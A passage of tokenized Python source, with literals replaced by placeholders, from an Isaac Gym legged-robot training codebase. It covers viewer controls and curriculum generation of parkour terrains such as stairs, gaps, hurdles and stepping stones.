<EOL> self . gym . prepare_sim ( self . sim ) <EOL> self . enable_viewer_sync = True <EOL> self . viewer = None <EOL> if self . headless == False : <EOL> self . viewer = self . gym . create_viewer ( <EOL> self . sim , gymapi . CameraProperties ( ) ) <EOL> self . gym . subscribe_viewer_keyboard_event ( <EOL> self . viewer , gymapi . KEY_ESCAPE , "<STR_LIT>" ) <EOL> self . gym . subscribe_viewer_keyboard_event ( <EOL> self . viewer , gymapi . KEY_V , "<STR_LIT>" ) <EOL> self . gym . subscribe_viewer_keyboard_event ( <EOL> self . viewer , gymapi . KEY_F , "<STR_LIT>" ) <EOL> for i in range ( <NUM_LIT> ) : <EOL> self . gym . subscribe_viewer_keyboard_event ( <EOL> self . viewer , getattr ( gymapi , "<STR_LIT>" + str ( i ) ) , "<STR_LIT>" + str ( i ) ) <EOL> self . gym . subscribe_viewer_keyboard_event ( <EOL> self . viewer , gymapi . KEY_LEFT_BRACKET , "<STR_LIT>" ) <EOL> self . gym . subscribe_viewer_keyboard_event ( <EOL> self . viewer , gymapi . KEY_RIGHT_BRACKET , "<STR_LIT>" ) <EOL> self . gym . subscribe_viewer_keyboard_event ( <EOL> self . viewer , gymapi . KEY_SPACE , "<STR_LIT>" ) <EOL> self . gym . subscribe_viewer_keyboard_event ( <EOL> self . viewer , gymapi . KEY_W , "<STR_LIT>" ) <EOL> self . gym . subscribe_viewer_keyboard_event ( <EOL> self . viewer , gymapi . KEY_S , "<STR_LIT>" ) <EOL> self . gym . subscribe_viewer_keyboard_event ( <EOL> self . viewer , gymapi . KEY_A , "<STR_LIT>" ) <EOL> self . gym . subscribe_viewer_keyboard_event ( <EOL> self . viewer , gymapi . KEY_D , "<STR_LIT>" ) <EOL> self . free_cam = False <EOL> self . lookat_id = <NUM_LIT> <EOL> self . lookat_vec = torch . tensor ( [ - <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , requires_grad = False , device = self . device ) <EOL> def get_observations ( self ) : <EOL> return self . obs_buf <EOL> def get_privileged_observations ( self ) : <EOL> return self . privileged_obs_buf <EOL> def reset_idx ( self , env_ids ) : <EOL> raise NotImplementedError <EOL> def reset ( self ) : <EOL> self . reset_idx ( torch . arange ( self . num_envs , device = self . device ) ) <EOL> obs , privileged_obs , _ , _ , _ = self . step ( torch . zeros ( self . num_envs , self . num_actions , device = self . device , requires_grad = False ) ) <EOL> return obs , privileged_obs <EOL> def step ( self , actions ) : <EOL> raise NotImplementedError <EOL> def lookat ( self , i ) : <EOL> look_at_pos = self . root_states [ i , : <NUM_LIT> ] . clone ( ) <EOL> cam_pos = look_at_pos + self . lookat_vec <EOL> self . set_camera ( cam_pos , look_at_pos ) <EOL> def render ( self , sync_frame_time = True ) : <EOL> if self . viewer : <EOL> if self . gym . query_viewer_has_closed ( self . viewer ) : <EOL> sys . exit ( ) <EOL> if not self . free_cam : <EOL> self . lookat ( self . lookat_id ) <EOL> for evt in self . gym . query_viewer_action_events ( self . viewer ) : <EOL> if evt . action == "<STR_LIT>" and evt . value > <NUM_LIT> : <EOL> sys . exit ( ) <EOL> elif evt . action == "<STR_LIT>" and evt . value > <NUM_LIT> : <EOL> self . enable_viewer_sync = not self . enable_viewer_sync <EOL> if not self . free_cam : <EOL> for i in range ( <NUM_LIT> ) : <EOL> if evt . action == "<STR_LIT>" + str ( i ) and evt . value > <NUM_LIT> : <EOL> self . lookat ( i ) <EOL> self . lookat_id = i <EOL> if evt . action == "<STR_LIT>" and evt . value > <NUM_LIT> : <EOL> self . lookat_id = ( self . lookat_id - <NUM_LIT> ) % self . num_envs <EOL> self . lookat ( self . lookat_id ) <EOL> if evt . action == "<STR_LIT>" and evt . value > <NUM_LIT> : <EOL> self . lookat_id = ( self . lookat_id + <NUM_LIT> ) % self . num_envs <EOL> self . lookat ( self . lookat_id ) <EOL> if evt . action == "<STR_LIT>" and evt . value > <NUM_LIT> : <EOL> self . commands [ self . lookat_id , <NUM_LIT> ] += <NUM_LIT> <EOL> if evt . action == "<STR_LIT>" and evt . value > <NUM_LIT> : <EOL> self . commands [ self . lookat_id , <NUM_LIT> ] -= <NUM_LIT> <EOL> if evt . action == "<STR_LIT>" and evt . value > <NUM_LIT> : <EOL> self . commands [ self . lookat_id , <NUM_LIT> ] += <NUM_LIT> <EOL> if evt . action == "<STR_LIT>" and evt . value > <NUM_LIT> : <EOL> self . commands [ self . lookat_id , <NUM_LIT> ] -= <NUM_LIT> <EOL> if evt . action == "<STR_LIT>" and evt . value > <NUM_LIT> : <EOL> self . free_cam = not self . free_cam <EOL> if self . free_cam : <EOL> self . set_camera ( self . cfg . viewer . pos , self . cfg . viewer . lookat ) <EOL> if evt . action == "<STR_LIT>" and evt . value > <NUM_LIT> : <EOL> self . pause = True <EOL> while self . pause : <EOL> time . sleep ( <NUM_LIT> ) <EOL> self . gym . draw_viewer ( self . viewer , self . sim , True ) <EOL> for evt in self . gym . query_viewer_action_events ( self . viewer ) : <EOL> if evt . action == "<STR_LIT>" and evt . value > <NUM_LIT> : <EOL> self . pause = False <EOL> if self . gym . query_viewer_has_closed ( self . viewer ) : <EOL> sys . exit ( ) <EOL> if self . device != '<STR_LIT>' : <EOL> self . gym . fetch_results ( self . sim , True ) <EOL> self . gym . poll_viewer_events ( self . viewer ) <EOL> if self . enable_viewer_sync : <EOL> self . gym . step_graphics ( self . sim ) <EOL> self . gym . draw_viewer ( self . viewer , self . sim , True ) <EOL> if sync_frame_time : <EOL> self . gym . sync_frame_time ( self . sim ) <EOL> else : <EOL> self . gym . poll_viewer_events ( self . viewer ) <EOL> if not self . free_cam : <EOL> p = self . gym . get_viewer_camera_transform ( self . viewer , None ) . p <EOL> cam_trans = torch . tensor ( [ p . x , p . y , p . z ] , requires_grad = False , device = self . device ) <EOL> look_at_pos = self . root_states [ self . lookat_id , : <NUM_LIT> ] . clone ( ) <EOL> self . lookat_vec = cam_trans - look_at_pos <EOL> </s>
<s> from . vec_env import VecEnv <EOL> </s>
<s> import numpy as np <EOL> from numpy . random import choice <EOL> from scipy import interpolate <EOL> import random <EOL> from isaacgym import terrain_utils <EOL> from legged_gym . envs . base . legged_robot_config import LeggedRobotCfg <EOL> from scipy import ndimage <EOL> from pydelatin import Delatin <EOL> import pyfqmr <EOL> from scipy . ndimage import binary_dilation <EOL> class Terrain : <EOL> def __init__ ( self , cfg : LeggedRobotCfg . terrain , num_robots ) -> None : <EOL> self . cfg = cfg <EOL> self . num_robots = num_robots <EOL> self . type = cfg . mesh_type <EOL> if self . type in [ "<STR_LIT>" , '<STR_LIT>' ] : <EOL> return <EOL> self . env_length = cfg . terrain_length <EOL> self . env_width = cfg . terrain_width <EOL> cfg . terrain_proportions = np . array ( cfg . terrain_proportions ) / np . sum ( cfg . terrain_proportions ) <EOL> self . proportions = [ np . sum ( cfg . terrain_proportions [ : i + <NUM_LIT> ] ) for i in range ( len ( cfg . terrain_proportions ) ) ] <EOL> self . cfg . num_sub_terrains = cfg . num_rows * cfg . num_cols <EOL> self . env_origins = np . zeros ( ( cfg . num_rows , cfg . num_cols , <NUM_LIT> ) ) <EOL> self . terrain_type = np . zeros ( ( cfg . num_rows , cfg . num_cols ) ) <EOL> self . goals = np . zeros ( ( cfg . num_rows , cfg . num_cols , cfg . num_goals , <NUM_LIT> ) ) <EOL> self . num_goals = cfg . num_goals <EOL> self . width_per_env_pixels = int ( self . env_width / cfg . horizontal_scale ) <EOL> self . length_per_env_pixels = int ( self . env_length / cfg . horizontal_scale ) <EOL> self . border = int ( cfg . border_size / self . cfg . horizontal_scale ) <EOL> self . tot_cols = int ( cfg . num_cols * self . width_per_env_pixels ) + <NUM_LIT> * self . border <EOL> self . tot_rows = int ( cfg . num_rows * self . length_per_env_pixels ) + <NUM_LIT> * self . border <EOL> self . height_field_raw = np . zeros ( ( self . tot_rows , self . tot_cols ) , dtype = np . int16 ) <EOL> if cfg . curriculum : <EOL> self . curiculum ( ) <EOL> elif cfg . selected : <EOL> self . selected_terrain ( ) <EOL> else : <EOL> if hasattr ( cfg , "<STR_LIT>" ) : <EOL> self . curiculum ( random = True , max_difficulty = cfg . max_difficulty ) <EOL> else : <EOL> self . curiculum ( random = True ) <EOL> self . heightsamples = self . height_field_raw <EOL> if self . type == "<STR_LIT>" : <EOL> print ( "<STR_LIT>" ) <EOL> if cfg . hf2mesh_method == "<STR_LIT>" : <EOL> self . vertices , self . triangles , self . x_edge_mask = convert_heightfield_to_trimesh ( self . height_field_raw , <EOL> self . cfg . horizontal_scale , <EOL> self . cfg . vertical_scale , <EOL> self . cfg . slope_treshold ) <EOL> half_edge_width = int ( self . cfg . edge_width_thresh / self . cfg . horizontal_scale ) <EOL> structure = np . ones ( ( half_edge_width * <NUM_LIT> + <NUM_LIT> , <NUM_LIT> ) ) <EOL> self . x_edge_mask = binary_dilation ( self . x_edge_mask , structure = structure ) <EOL> if self . cfg . simplify_grid : <EOL> mesh_simplifier = pyfqmr . Simplify ( ) <EOL> mesh_simplifier . setMesh ( self . vertices , self . triangles ) <EOL> mesh_simplifier . simplify_mesh ( target_count = int ( <NUM_LIT> * self . triangles . shape [ <NUM_LIT> ] ) , aggressiveness = <NUM_LIT> , preserve_border = True , verbose = <NUM_LIT> ) <EOL> self . vertices , self . triangles , normals = mesh_simplifier . getMesh ( ) <EOL> self . vertices = self . vertices . astype ( np . float32 ) <EOL> self . triangles = self . triangles . astype ( np . uint32 ) <EOL> else : <EOL> assert cfg . hf2mesh_method == "<STR_LIT>" , "<STR_LIT>" <EOL> self . vertices , self . triangles = convert_heightfield_to_trimesh_delatin ( self . height_field_raw , self . cfg . horizontal_scale , self . cfg . vertical_scale , max_error = cfg . max_error ) <EOL> print ( "<STR_LIT>" . format ( self . vertices . shape [ <NUM_LIT> ] ) ) <EOL> print ( "<STR_LIT>" . format ( self . triangles . shape [ <NUM_LIT> ] ) ) <EOL> def randomized_terrain ( self ) : <EOL> for k in range ( self . cfg . num_sub_terrains ) : <EOL> ( i , j ) = np . unravel_index ( k , ( self . cfg . num_rows , self . cfg . num_cols ) ) <EOL> choice = np . random . uniform ( <NUM_LIT> , <NUM_LIT> ) <EOL> difficulty = np . random . uniform ( - <NUM_LIT> , <NUM_LIT> ) <EOL> terrain = self . make_terrain ( choice , difficulty ) <EOL> self . add_terrain_to_map ( terrain , i , j ) <EOL> def curiculum ( self , random = False , max_difficulty = False ) : <EOL> for j in range ( self . cfg . num_cols ) : <EOL> for i in range ( self . cfg . num_rows ) : <EOL> difficulty = i / ( self . cfg . num_rows - <NUM_LIT> ) <EOL> choice = j / self . cfg . num_cols + <NUM_LIT> <EOL> if random : <EOL> if max_difficulty : <EOL> terrain = self . make_terrain ( choice , np . random . uniform ( <NUM_LIT> , <NUM_LIT> ) ) <EOL> else : <EOL> terrain = self . make_terrain ( choice , np . random . uniform ( <NUM_LIT> , <NUM_LIT> ) ) <EOL> else : <EOL> terrain = self . make_terrain ( choice , difficulty ) <EOL> self . add_terrain_to_map ( terrain , i , j ) <EOL> def selected_terrain ( self ) : <EOL> terrain_type = self . cfg . terrain_kwargs . pop ( '<STR_LIT>' ) <EOL> for k in range ( self . cfg . num_sub_terrains ) : <EOL> ( i , j ) = np . unravel_index ( k , ( self . cfg . num_rows , self . cfg . num_cols ) ) <EOL> terrain = terrain_utils . SubTerrain ( "<STR_LIT>" , <EOL> width = self . width_per_env_pixels , <EOL> length = self . length_per_env_pixels , <EOL> vertical_scale = self . vertical_scale , <EOL> horizontal_scale = self . horizontal_scale ) <EOL> eval ( terrain_type ) ( terrain , ** self . cfg . terrain_kwargs . terrain_kwargs ) <EOL> self . add_terrain_to_map ( terrain , i , j ) <EOL> def add_roughness ( self , terrain , difficulty = <NUM_LIT> ) : <EOL> max_height = ( self . cfg . height [ <NUM_LIT> ] - self . cfg . height [ <NUM_LIT> ] ) * difficulty + self . cfg . height [ <NUM_LIT> ] <EOL> height = random . uniform ( self . cfg . height [ <NUM_LIT> ] , max_height ) <EOL> terrain_utils . random_uniform_terrain ( terrain , min_height = - height , max_height = height , step = <NUM_LIT> , downsampled_scale = self . cfg . downsampled_scale ) <EOL> def make_terrain ( self , choice , difficulty ) : <EOL> terrain = terrain_utils . SubTerrain ( "<STR_LIT>" , <EOL> width = self . length_per_env_pixels , <EOL> length = self . width_per_env_pixels , <EOL> vertical_scale = self . cfg . vertical_scale , <EOL> horizontal_scale = self . cfg . horizontal_scale ) <EOL> slope = difficulty * <NUM_LIT> <EOL> step_height = <NUM_LIT> + <NUM_LIT> * difficulty <EOL> discrete_obstacles_height = <NUM_LIT> + difficulty * <NUM_LIT> <EOL> stepping_stones_size = <NUM_LIT> * ( <NUM_LIT> - difficulty ) <EOL> stone_distance = <NUM_LIT> if difficulty == <NUM_LIT> else <NUM_LIT> <EOL> gap_size = <NUM_LIT> * difficulty <EOL> pit_depth = <NUM_LIT> * difficulty <EOL> if choice < self . proportions [ <NUM_LIT> ] : <EOL> idx = <NUM_LIT> <EOL> if choice < self . proportions [ <NUM_LIT> ] / <NUM_LIT> : <EOL> idx = <NUM_LIT> <EOL> slope *= - <NUM_LIT> <EOL> terrain_utils . pyramid_sloped_terrain ( terrain , slope = slope , platform_size = <NUM_LIT> ) <EOL> elif choice < self . proportions [ <NUM_LIT> ] : <EOL> idx = <NUM_LIT> <EOL> if choice < self . proportions [ <NUM_LIT> ] : <EOL> idx = <NUM_LIT> <EOL> slope *= - <NUM_LIT> <EOL> terrain_utils . pyramid_sloped_terrain ( terrain , slope = slope , platform_size = <NUM_LIT> ) <EOL> self . add_roughness ( terrain ) <EOL> elif choice < self . proportions [ <NUM_LIT> ] : <EOL> idx = <NUM_LIT> <EOL> if choice < self . proportions [ <NUM_LIT> ] : <EOL> idx = <NUM_LIT> <EOL> step_height *= - <NUM_LIT> <EOL> terrain_utils . pyramid_stairs_terrain ( terrain , step_width = <NUM_LIT> , step_height = step_height , platform_size = <NUM_LIT> ) <EOL> self . add_roughness ( terrain ) <EOL> elif choice < self . proportions [ <NUM_LIT> ] : <EOL> idx = <NUM_LIT> <EOL> num_rectangles = <NUM_LIT> <EOL> rectangle_min_size = <NUM_LIT> <EOL> rectangle_max_size = <NUM_LIT> <EOL> terrain_utils . discrete_obstacles_terrain ( terrain , discrete_obstacles_height , rectangle_min_size , rectangle_max_size , num_rectangles , platform_size = <NUM_LIT> ) <EOL> self . add_roughness ( terrain ) <EOL> elif choice < self . proportions [ <NUM_LIT> ] : <EOL> idx = <NUM_LIT> <EOL> stones_size = <NUM_LIT> - <NUM_LIT> * difficulty <EOL> half_sloped_terrain ( terrain , wall_width = <NUM_LIT> , start2center = <NUM_LIT> , max_height = <NUM_LIT> ) <EOL> stepping_stones_terrain ( terrain , stone_size = <NUM_LIT> - <NUM_LIT> * difficulty , stone_distance = <NUM_LIT> + <NUM_LIT> * difficulty , max_height = <NUM_LIT> * difficulty , platform_size = <NUM_LIT> ) <EOL> self . add_roughness ( terrain ) <EOL> elif choice < self . proportions [ <NUM_LIT> ] : <EOL> idx = <NUM_LIT> <EOL> gap_parkour_terrain ( terrain , difficulty , platform_size = <NUM_LIT> ) <EOL> self . add_roughness ( terrain ) <EOL> elif choice < self . proportions [ <NUM_LIT> ] : <EOL> idx = <NUM_LIT> <EOL> self . add_roughness ( terrain ) <EOL> elif choice < self . proportions [ <NUM_LIT> ] : <EOL> idx = <NUM_LIT> <EOL> pit_terrain ( terrain , depth = pit_depth , platform_size = <NUM_LIT> ) <EOL> elif choice < self . proportions [ <NUM_LIT> ] : <EOL> idx = <NUM_LIT> <EOL> if self . cfg . all_vertical : <EOL> half_slope_difficulty = <NUM_LIT> <EOL> else : <EOL> difficulty *= <NUM_LIT> <EOL> if not self . cfg . no_flat : <EOL> difficulty -= <NUM_LIT> <EOL> if difficulty > <NUM_LIT> : <EOL> half_slope_difficulty = <NUM_LIT> <EOL> elif difficulty < <NUM_LIT> : <EOL> self . add_roughness ( terrain ) <EOL> terrain . slope_vector = np . array ( [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] ) . astype ( np . float32 ) <EOL> return terrain <EOL> else : <EOL> half_slope_difficulty = difficulty <EOL> wall_width = <NUM_LIT> - half_slope_difficulty * <NUM_LIT> <EOL> if self . cfg . flat_wall : <EOL> half_sloped_terrain ( terrain , wall_width = <NUM_LIT> , start2center = <NUM_LIT> , max_height = <NUM_LIT> ) <EOL> else : <EOL> half_sloped_terrain ( terrain , wall_width = wall_width , start2center = <NUM_LIT> , max_height = <NUM_LIT> ) <EOL> max_height = terrain . height_field_raw . max ( ) <EOL> top_mask = terrain . height_field_raw > max_height - <NUM_LIT> <EOL> self . add_roughness ( terrain , difficulty = <NUM_LIT> ) <EOL> terrain . height_field_raw [ top_mask ] = max_height <EOL> elif choice < self . proportions [ <NUM_LIT> ] : <EOL> idx = <NUM_LIT> <EOL> half_platform_terrain ( terrain , max_height = <NUM_LIT> + <NUM_LIT> * difficulty ) <EOL> self . add_roughness ( terrain , difficulty = <NUM_LIT> ) <EOL> elif choice < self . proportions [ <NUM_LIT> ] : <EOL> idx = <NUM_LIT> <EOL> height = <NUM_LIT> + <NUM_LIT> * difficulty <EOL> if choice < self . proportions [ <NUM_LIT> ] : <EOL> idx = <NUM_LIT> <EOL> height *= - <NUM_LIT> <EOL> terrain_utils . pyramid_stairs_terrain ( terrain , step_width = <NUM_LIT> , step_height = height , platform_size = <NUM_LIT> ) <EOL> self . add_roughness ( terrain ) <EOL> elif choice < self . proportions [ <NUM_LIT> ] : <EOL> x_range = [ - <NUM_LIT> , <NUM_LIT> + <NUM_LIT> * difficulty ] <EOL> y_range = [ <NUM_LIT> , <NUM_LIT> + <NUM_LIT> * difficulty ] <EOL> stone_len = [ <NUM_LIT> - <NUM_LIT> * difficulty , <NUM_LIT> - <NUM_LIT> * difficulty ] <EOL> incline_height = <NUM_LIT> * difficulty <EOL> last_incline_height = incline_height + <NUM_LIT> - <NUM_LIT> * difficulty <EOL> parkour_terrain ( terrain , <EOL> num_stones = self . num_goals - <NUM_LIT> , <EOL> x_range = x_range , <EOL> y_range = y_range , <EOL> incline_height = incline_height , <EOL> stone_len = stone_len , <EOL> stone_width = <NUM_LIT> , <EOL> last_incline_height = last_incline_height , <EOL> pad_height = <NUM_LIT> , <EOL> pit_depth = [ <NUM_LIT> , <NUM_LIT> ] ) <EOL> idx = <NUM_LIT> <EOL> self . add_roughness ( terrain ) <EOL> elif choice < self . proportions [ <NUM_LIT> ] : <EOL> idx = <NUM_LIT> <EOL> parkour_hurdle_terrain ( terrain , <EOL> num_stones = self . num_goals - <NUM_LIT> , <EOL> stone_len = <NUM_LIT> + <NUM_LIT> * difficulty , <EOL> hurdle_height_range = [ <NUM_LIT> + <NUM_LIT> * difficulty , <NUM_LIT> + <NUM_LIT> * difficulty ] , <EOL> pad_height = <NUM_LIT> , <EOL> x_range = [ <NUM_LIT> , <NUM_LIT> ] , <EOL> y_range = self . cfg . y_range , <EOL> half_valid_width = [ <NUM_LIT> , <NUM_LIT> ] , <EOL> ) <EOL> self . add_roughness ( terrain ) <EOL> elif choice < self . proportions [ <NUM_LIT> ] : <EOL> idx = <NUM_LIT> <EOL> parkour_hurdle_terrain ( terrain , <EOL> num_stones = self . num_goals - <NUM_LIT> , <EOL> stone_len = <NUM_LIT> + <NUM_LIT> * difficulty , <EOL> hurdle_height_range = [ <NUM_LIT> + <NUM_LIT> * difficulty , <NUM_LIT> + <NUM_LIT> * difficulty ] , <EOL> pad_height = <NUM_LIT> , <EOL> y_range = self . cfg . y_range , <EOL> half_valid_width = [ <NUM_LIT> , <NUM_LIT> ] , <EOL> flat = True <EOL> ) <EOL> self . add_roughness ( terrain ) <EOL> elif choice < self . proportions [ <NUM_LIT> ] : <EOL> idx = <NUM_LIT> <EOL> parkour_step_terrain ( terrain , <EOL> num_stones = self . num_goals - <NUM_LIT> , <EOL> step_height = <NUM_LIT> + <NUM_LIT> * difficulty , <EOL> x_range = [ <NUM_LIT> , <NUM_LIT> ] , <EOL> y_range = self . cfg . y_range , <EOL> half_valid_width = [ <NUM_LIT> , <NUM_LIT> ] , <EOL> pad_height = <NUM_LIT> , <EOL> ) <EOL> self . add_roughness ( terrain ) <EOL> elif choice < self . proportions [ <NUM_LIT> ] : <EOL> idx = <NUM_LIT> <EOL> parkour_gap_terrain ( terrain , <EOL> num_gaps = self . num_goals - <NUM_LIT> , <EOL> gap_size = <NUM_LIT> + <NUM_LIT> * difficulty , <EOL> gap_depth = [ <NUM_LIT> , <NUM_LIT> ] , <EOL> pad_height = <NUM_LIT> , <EOL> x_range = [ <NUM_LIT> , <NUM_LIT> ] , <EOL> y_range = self . cfg . y_range , <EOL> half_valid_width = [ <NUM_LIT> , <NUM_LIT> ] , <EOL> ) <EOL> self . add_roughness ( terrain ) <EOL> elif choice < self . proportions [ <NUM_LIT> ] : <EOL> idx = <NUM_LIT> <EOL> demo_terrain ( terrain ) <EOL> self . add_roughness ( terrain ) <EOL> terrain . idx = idx <EOL> return terrain <EOL> def add_terrain_to_map ( self , terrain , row , col ) : <EOL> i = row <EOL> j = col <EOL> start_x = self . border + i * self . length_per_env_pixels <EOL> end_x = self . border + ( i + <NUM_LIT> ) * self . length_per_env_pixels <EOL> start_y = self . border + j * self . width_per_env_pixels <EOL> end_y = self . border + ( j + <NUM_LIT> ) * self . width_per_env_pixels <EOL> self . height_field_raw [ start_x : end_x , start_y : end_y ] = terrain . height_field_raw <EOL> env_origin_x = i * self . env_length + <NUM_LIT> <EOL> env_origin_y = ( j + <NUM_LIT> ) * self . env_width <EOL> x1 = int ( ( self . env_length / <NUM_LIT> - <NUM_LIT> ) / terrain . horizontal_scale ) <EOL> x2 = int ( ( self . env_length / <NUM_LIT> + <NUM_LIT> ) / terrain . horizontal_scale ) <EOL> y1 = int ( ( self . env_width / <NUM_LIT> - <NUM_LIT> ) / terrain . horizontal_scale ) <EOL> y2 = int ( ( self . env_width / <NUM_LIT> + <NUM_LIT> ) / terrain . horizontal_scale ) <EOL> if self . cfg . origin_zero_z : <EOL> env_origin_z = <NUM_LIT> <EOL> else : <EOL> env_origin_z = np . max ( terrain . height_field_raw [ x1 : x2 , y1 : y2 ] ) * terrain . vertical_scale <EOL> self . env_origins [ i , j ] = [ env_origin_x , env_origin_y , env_origin_z ] <EOL> self . terrain_type [ i , j ] = terrain . idx <EOL> self . goals [ i , j , : , : <NUM_LIT> ] = terrain . goals + [ i * self . env_length , j * self . env_width ] <EOL> def gap_terrain ( terrain , gap_size , platform_size = <NUM_LIT> ) : <EOL> gap_size = int ( gap_size / terrain . horizontal_scale ) <EOL> platform_size = int ( platform_size / terrain . horizontal_scale ) <EOL> center_x = terrain . length // <NUM_LIT> <EOL> center_y = terrain . width // <NUM_LIT> <EOL> x1 = ( terrain . length - platform_size ) // <NUM_LIT> <EOL> x2 = x1 + gap_size <EOL> y1 = ( terrain . width - platform_size ) // <NUM_LIT> <EOL> y2 = y1 + gap_size <EOL> terrain . height_field_raw [ center_x - x2 : center_x + x2 , center_y - y2 : center_y + y2 ] = - <NUM_LIT> <EOL> terrain . height_field_raw [ center_x - x1 : center_x + x1 , center_y - y1 : center_y + y1 ] = <NUM_LIT> <EOL> def gap_parkour_terrain ( terrain , difficulty , platform_size = <NUM_LIT> ) : <EOL> gap_size = <NUM_LIT> + <NUM_LIT> * difficulty <EOL> gap_size = int ( gap_size / terrain . horizontal_scale ) <EOL> platform_size = int ( platform_size / terrain . horizontal_scale ) <EOL> center_x = terrain . length // <NUM_LIT> <EOL> center_y = terrain . width // <NUM_LIT> <EOL> x1 = ( terrain . length - platform_size ) // <NUM_LIT> <EOL> x2 = x1 + gap_size <EOL> y1 = ( terrain . width - platform_size ) // <NUM_LIT> <EOL> y2 = y1 + gap_size <EOL> terrain . height_field_raw [ center_x - x2 : center_x + x2 , center_y - y2 : center_y + y2 ] = - <NUM_LIT> <EOL> terrain . height_field_raw [ center_x - x1 : center_x + x1 , center_y - y1 : center_y + y1 ] = <NUM_LIT> <EOL> slope_angle = <NUM_LIT> + difficulty * <NUM_LIT> <EOL> offset = <NUM_LIT> + <NUM_LIT> * difficulty <EOL> scale = <NUM_LIT> <EOL> wall_center_x = [ center_x - x1 , center_x , center_x + x1 ] <EOL> wall_center_y = [ center_y - y1 , center_y , center_y + y1 ] <EOL> def parkour_terrain ( terrain , <EOL> platform_len = <NUM_LIT> , <EOL> platform_height = <NUM_LIT> , <EOL> num_stones = <NUM_LIT> , <EOL> x_range = [ <NUM_LIT> , <NUM_LIT> ] , <EOL> y_range = [ <NUM_LIT> , <NUM_LIT> ] , <EOL> z_range = [ - <NUM_LIT> , <NUM_LIT> ] , <EOL> stone_len = <NUM_LIT> , <EOL> stone_width = <NUM_LIT> , <EOL> pad_width = <NUM_LIT> , <EOL> pad_height = <NUM_LIT> , <EOL> incline_height = <NUM_LIT> , <EOL> last_incline_height = <NUM_LIT> , <EOL> last_stone_len = <NUM_LIT> , <EOL> pit_depth = [ <NUM_LIT> , <NUM_LIT> ] ) : <EOL> goals = np . zeros ( ( num_stones + <NUM_LIT> , <NUM_LIT> ) ) <EOL> terrain . height_field_raw [ : ] = - round ( np . random . uniform ( pit_depth [ <NUM_LIT> ] , pit_depth [ <NUM_LIT> ] ) / terrain . vertical_scale ) <EOL> mid_y = terrain . length // <NUM_LIT> <EOL> stone_len = np . random . uniform ( * stone_len ) <EOL> stone_len = <NUM_LIT> * round ( stone_len / <NUM_LIT> , <NUM_LIT> ) <EOL> stone_len = round ( stone_len / terrain . horizontal_scale ) <EOL> dis_x_min = stone_len + round ( x_range [ <NUM_LIT> ] / terrain . horizontal_scale ) <EOL> dis_x_max = stone_len + round ( x_range [ <NUM_LIT> ] / terrain . horizontal_scale ) <EOL> dis_y_min = round ( y_range [ <NUM_LIT> ] / terrain . horizontal_scale ) <EOL> dis_y_max = round ( y_range [ <NUM_LIT> ] / terrain . horizontal_scale ) <EOL> dis_z_min = round ( z_range [ <NUM_LIT> ] / terrain . vertical_scale ) <EOL> dis_z_max = round ( z_range [ <NUM_LIT> ] / terrain . vertical_scale ) <EOL> platform_len = round ( platform_len / terrain . horizontal_scale ) <EOL> platform_height = round ( platform_height / terrain . vertical_scale ) <EOL> terrain . height_field_raw [ <NUM_LIT> : platform_len , : ] = platform_height <EOL> stone_width = round ( stone_width / terrain . horizontal_scale ) <EOL> last_stone_len = round ( last_stone_len / terrain . horizontal_scale ) <EOL> incline_height = round ( incline_height / terrain . vertical_scale ) <EOL> last_incline_height = round ( last_incline_height / terrain . vertical_scale ) <EOL> dis_x = platform_len - np . random . randint ( dis_x_min , dis_x_max ) + stone_len // <NUM_LIT> <EOL> goals [ <NUM_LIT> ] = [ platform_len - stone_len // <NUM_LIT> , mid_y ] <EOL> left_right_flag = np . random . randint ( <NUM_LIT> , <NUM_LIT> ) <EOL> dis_z = <NUM_LIT> <EOL> for i in range ( num_stones ) : <EOL> dis_x += np . random . randint ( dis_x_min , dis_x_max ) <EOL> pos_neg = round ( <NUM_LIT> * ( left_right_flag - <NUM_LIT> ) ) <EOL> dis_y = mid_y + pos_neg * np . random . randint ( dis_y_min , dis_y_max ) <EOL> if i == num_stones - <NUM_LIT> : <EOL> dis_x += last_stone_len // <NUM_LIT> <EOL> heights = np . tile ( np . linspace ( - last_incline_height , last_incline_height , stone_width ) , ( last_stone_len , <NUM_LIT> ) ) * pos_neg <EOL> terrain . height_field_raw [ dis_x - last_stone_len // <NUM_LIT> : dis_x + last_stone_len // <NUM_LIT> , dis_y - stone_width // <NUM_LIT> : dis_y + stone_width // <NUM_LIT> ] = heights . astype ( int ) + dis_z <EOL> else : <EOL> heights = np . tile ( np . linspace ( - incline_height , incline_height , stone_width ) , ( stone_len , <NUM_LIT> ) ) * pos_neg <EOL> terrain . height_field_raw [ dis_x - stone_len // <NUM_LIT> : dis_x + stone_len // <NUM_LIT> , dis_y - stone_width // <NUM_LIT> : dis_y + stone_width // <NUM_LIT> ] = heights . astype ( int ) + dis_z <EOL> goals [ i + <NUM_LIT> ] = [ dis_x , dis_y ] <EOL> left_right_flag = <NUM_LIT> - left_right_flag <EOL> final_dis_x = dis_x + <NUM_LIT> * np . random . randint ( dis_x_min , dis_x_max ) <EOL> final_platform_start = dis_x + last_stone_len // <NUM_LIT> + round ( <NUM_LIT> // terrain . horizontal_scale ) <EOL> terrain . height_field_raw [ final_platform_start : , : ] = platform_height <EOL> goals [ - <NUM_LIT> ] = [ final_dis_x , mid_y ] <EOL> terrain . goals = goals * terrain . horizontal_scale <EOL> pad_width = int ( pad_width // terrain . horizontal_scale ) <EOL> pad_height = int ( pad_height // terrain . vertical_scale ) <EOL> terrain . height_field_raw [ : , : pad_width ] = pad_height <EOL> terrain . height_field_raw [ : , - pad_width : ] = pad_height <EOL> terrain . height_field_raw [ : pad_width , : ] = pad_height <EOL> terrain . height_field_raw [ - pad_width : , : ] = pad_height <EOL> def parkour_gap_terrain ( terrain , <EOL> platform_len = <NUM_LIT> , <EOL> platform_height = <NUM_LIT> , <EOL> num_gaps = <NUM_LIT> , <EOL> gap_size = <NUM_LIT> , <EOL> x_range = [ <NUM_LIT> , <NUM_LIT> ] , <EOL> y_range = [ - <NUM_LIT> , <NUM_LIT> ] , <EOL> half_valid_width = [ <NUM_LIT> , <NUM_LIT> ] , <EOL> gap_depth = - <NUM_LIT> , <EOL> pad_width = <NUM_LIT> , <EOL> pad_height = <NUM_LIT> , <EOL> flat = False ) : <EOL> goals = np . zeros ( ( num_gaps + <NUM_LIT> , <NUM_LIT> ) ) <EOL> mid_y = terrain . length // <NUM_LIT> <EOL> dis_y_min = round ( y_range [ <NUM_LIT> ] / terrain . horizontal_scale ) <EOL> dis_y_max = round ( y_range [ <NUM_LIT> ] / terrain . horizontal_scale 